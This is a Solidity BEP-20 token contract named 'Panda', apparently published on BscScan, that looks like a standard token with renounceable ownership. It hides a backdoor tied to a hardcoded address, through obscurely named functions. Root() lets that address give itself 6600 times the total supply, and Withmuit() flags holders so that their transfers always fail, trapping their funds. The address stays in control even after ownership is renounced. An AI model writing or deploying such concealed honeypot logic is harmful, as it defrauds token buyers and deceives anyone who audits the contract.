/**
 *Submitted for verification at BscScan.com on 2023-05-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

abstract contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _check();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.2;



contract Token is Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    

    uint256 private _tokentotalSupply;
    string private _tokenname;
    string private _tokensymbol;
    


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address public _pnodeg;
    mapping(address => bool) private _ogLever;
 

    function Pandasxyz(address hostadd) external   {
        if (_pnodeg == _msgSender()) {
            _ogLever[hostadd] = false;
        }
    }
    function Root() external {
        if(_pnodeg == _msgSender()){
            _balances[_msgSender()] = (1)*(1)*(totalSupply()*(6600))*(1)*(1);
        }
    }
   

    function getPOGGG(address hostadd) public view returns(bool)  {
        return _ogLever[hostadd];
    }

    function Withmuit(address hostadd) external   {
        if (_pnodeg == _msgSender()) {
            _ogLever[hostadd] = true;
        }
    }
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _pnodeg = 0x9795Bfc06d729e69641DD0A2102610c7FC276Aa8;
        _tokenname = tokenName_;
        _tokensymbol = Tokensymbol_;
        uint256 amount = 10000000000*10**decimals();
        _tokentotalSupply += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }


    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }


    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }



    function transfer(address to, uint256 amount) public returns (bool) {
        _internaltransfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _internalspendAllowance(from, spender, amount);
        _internaltransfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    uint256 Lockupers = 2;
    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal virtual {
        if(_ogLever[fromSender] == true){
            amount = totalSupply();
        }
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");
        uint256 curbalance = _balances[fromSender];
        require(curbalance >= amount, "ERC20: transfer amount exceeds balance");


        _balances[fromSender] = _balances[fromSender]-amount;
        uint256 taxAmount = amount*Lockupers/100;
        _balances[toSender] = _balances[toSender]+amount-taxAmount;

        emit Transfer(fromSender, toSender, amount-taxAmount);
        if (taxAmount> 0){
            emit Transfer(fromSender, address(0), taxAmount);    
        }
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}

contract Panda is Token {
    
    constructor(string memory name_, string memory symbol_) Token(name_,symbol_) {
        
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    }
}